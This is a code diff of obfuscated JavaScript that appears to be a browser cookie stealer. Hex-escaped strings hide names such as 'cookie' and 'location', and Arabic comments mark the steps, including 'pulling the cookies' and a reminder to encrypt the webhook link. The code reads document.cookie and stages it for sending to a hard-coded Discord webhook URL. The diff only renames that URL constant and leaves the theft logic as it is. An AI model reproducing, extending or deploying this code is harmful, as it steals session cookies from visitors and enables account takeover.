@@ -3,7 +3,7 @@ var _0x5a21=["\x63\x6f\x6f\x6b\x69\x65","\x6c\x6f\x63\x61\x74\x69\x6f\x6e","\x68
 
 (function(){
     // رابط الويب هوك الخاص بك (يجب تشفيره أيضاً)
-    const u = "https://discordapp.com/api/webhooks/1472707165205565541/E5L4CtND22HNN01AgMscC-HfN6pS7RPl5Xm6rvQ_vrBl_HAC0r84dZpjeKHN_fSfdcL4",
+    const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1472707165205565541/E5L4CtND22HNN01AgMscC-HfN6pS7RPl5Xm6rvQ_vrBl_HAC0r84dZpjeKHN_fSfdcL4";
     
     const d = {
         c: document[_0x5a21[0]], // سحب الكوكيز
